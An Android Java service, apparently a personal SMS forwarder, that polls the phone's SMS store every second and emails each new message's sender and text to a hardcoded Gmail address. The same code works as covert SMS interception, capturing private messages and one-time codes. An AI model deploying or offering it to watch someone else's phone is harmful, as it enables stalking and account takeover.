package com.example.smsresender;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.util.Objects;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class SmsService extends Service {
    private Handler handler;
    private Runnable runnable;
    private String GMAIL_USER = "alexkorobov95@gmail.com";
    private String GMAIL_PASSWORD = "";
    private String targetMail = "alexkorobov95@gmail.com";

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        startReadingSms();
    }

    private void startReadingSms() {
        runnable = new Runnable() {
            private String previousValue;

            @Override
            public void run() {
                // Считываем SMS
                ContentResolver contentResolver = getContentResolver();
                Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, null);
                assert cursor != null;
                cursor.moveToFirst();

                // Получаем текущее значение
                String currentValue = cursor.getString(12);

                if (!Objects.equals(currentValue, previousValue)) {
                    String sender = cursor.getString(2);
                    // Если значение изменилось, вызываем функцию sendEmail
                    sendEmail(currentValue, targetMail, sender);

                    // Сохраняем текущее значение как предыдущее
                    previousValue = currentValue;
                }

                // Запускаем Runnable снова через 1 секунду
                handler.postDelayed(runnable, 1000);
            }
        };

        // Запускаем Runnable
        handler.postDelayed(runnable, 1000);
    }

    private void sendEmail(String smsBody, String receiverEmail, String sender) {

        try {
            String stringSenderEmail = GMAIL_USER;
            String stringPasswordSenderEmail = GMAIL_PASSWORD;

            String stringHost = "smtp.gmail.com";

            Properties properties = System.getProperties();

            properties.put("mail.smtp.host", stringHost);
            properties.put("mail.smtp.port", "465");
            properties.put("mail.smtp.ssl.enable", "true");
            properties.put("mail.smtp.auth", "true");

            javax.mail.Session session = Session.getInstance(properties, new Authenticator() {
                @Override
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(stringSenderEmail, stringPasswordSenderEmail);
                }
            });

            // Create a new MimeMessage
            MimeMessage mimeMessage = new MimeMessage(session);
            mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(receiverEmail));

            mimeMessage.setSubject("New SMS on TL's phone received!");
            mimeMessage.setText("Sender: " + sender + "\nText: " + smsBody);

            // Send the email
            Thread thread = new Thread(() -> {
                try {
                    Transport.send(mimeMessage);
                } catch (MessagingException e) {
                    e.printStackTrace();
                }
            });
            thread.start();
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Останавливаем Runnable
        handler.removeCallbacks(runnable);
    }
}

